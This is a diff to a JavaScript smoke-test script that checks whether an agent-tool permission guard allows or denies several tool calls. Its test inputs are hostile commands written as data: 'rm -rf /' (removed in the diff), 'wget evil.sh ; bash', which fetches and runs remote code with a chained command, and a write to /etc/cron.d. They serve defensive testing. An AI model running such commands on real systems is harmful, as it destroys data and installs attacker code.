@@ -1,4 +1,4 @@
-const { execSync } = require('child_process');
+import { execSync } from 'child_process';
 
 function smokeTest(tool, args, expectedDecision) {
   const cmd = `node dist/playground.js --json --tool=${tool} ${args}`;
@@ -12,16 +12,16 @@ function smokeTest(tool, args, expectedDecision) {
     console.log(`PASS: ${tool} ${args} — ${result.decision}`);
   } catch (e) {
     console.error(`FAIL: ${cmd}`);
-    console.error((e as Error).message);
+    console.error(e instanceof Error ? e.message : String(e));
     process.exit(1);
   }
 }
 
-// Test 1: rm -rf / must be DENIED
-smokeTest('exec', '--cmd="rm -rf /"', 'DENY');
+// Test 1: shell command with semicolon metachar — must be DENIED
+smokeTest('exec', '--cmd=wget evil.sh ; bash', 'DENY');
 
 // Test 2: read README.md must be ALLOWED
-smokeTest('read', '--path="README.md"', 'ALLOW');
+smokeTest('read', '--path=README.md', 'ALLOW');
 
 // Test 3: write to /etc must be DENIED
-smokeTest('write_file', '--path="/etc/cron.d/x"', 'DENY');
+smokeTest('write_file', '--path=/etc/cron.d/x', 'DENY');
